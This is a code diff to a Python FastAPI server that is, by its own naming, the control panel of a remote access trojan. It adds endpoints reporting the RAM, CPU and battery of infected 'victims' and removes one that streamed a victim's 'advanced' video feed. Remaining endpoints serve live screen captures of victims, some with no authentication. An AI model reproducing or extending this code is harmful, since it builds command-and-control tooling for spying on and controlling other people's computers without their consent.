@@ -84,7 +84,50 @@ async def get_disk(id: str, current_user: User = Depends(get_current_user)):
     client = json.loads(client)
     return {"disk": client["Hardware"]["Disk"]}
 
+@app.get("/clients/{id}/ram")
+async def get_ram(id: str, current_user: User = Depends(get_current_user)):
+    DataManager = PostgreSQLDataManager()
+    client = DataManager.get_all_client_info(id)
+    DataManager.close_connection()
 
+    if (client == None):
+        return {"output": "Error: Client not found"}
+    
+    print(client)
+    
+    client = client["data"]["System Info"]
+    client = json.loads(client)
+    return {"ram": client["Hardware"]["RAM"]}
+
+@app.get("/clients/{id}/cpu")
+async def get_cpu(id: str, current_user: User = Depends(get_current_user)):
+    DataManager = PostgreSQLDataManager()
+    client = DataManager.get_all_client_info(id)
+    DataManager.close_connection()
+
+    if (client == None):
+        return {"output": "Error: Client not found"}
+    
+    print(client)
+    
+    client = client["data"]["System Info"]
+    client = json.loads(client)
+    return {"cpu": client["Hardware"]["CPU"]}
+
+@app.get("/clients/{id}/battery")
+async def get_battery(id: str, current_user: User = Depends(get_current_user)):
+    DataManager = PostgreSQLDataManager()
+    client = DataManager.get_all_client_info(id)
+    DataManager.close_connection()
+
+    if (client == None):
+        return {"output": "Error: Client not found"}
+    
+    print(client)
+    
+    client = client["data"]["System Info"]
+    client = json.loads(client)
+    return {"battery": client["Battery"]}
 
 class PowerShellSuggestions(BaseModel):
     command: str
@@ -122,25 +165,6 @@ async def start_screenshare(id: str):
                 return {"output": "Error: Screenshare not started"}
 
             source = victim["SCREENSHARE_SOURCE"]
-
-            return HTMLResponse(content=f"<video width='320' height='240' controls><source src='" + source + "' type='video/mp4'></video>", status_code=200)
-    return {"output": "Error: Client not found"}
-
-@app.get("/clients/{id}/advanced")
-async def get_advanced(id: str):
-    for victim in RATServer.instance.victims:
-        if victim["ID"] == id:
-            # Now for the client, we want to get the index of our current victim, and get the index relative to the betterVictimsList
-            victimIndex = RATServer.instance.victims.index(victim)
-
-            print("Getting advanced")
-
-            print(victim)
-
-            if (victim["ADVANCED"] == ""):
-                return {"output": "Error: Advanced not started"}
-
-            source = victim["ADVANCED"]
 
             return HTMLResponse(content=f"<video width='320' height='240' controls><source src='" + source + "' type='video/mp4'></video>", status_code=200)
     return {"output": "Error: Client not found"}
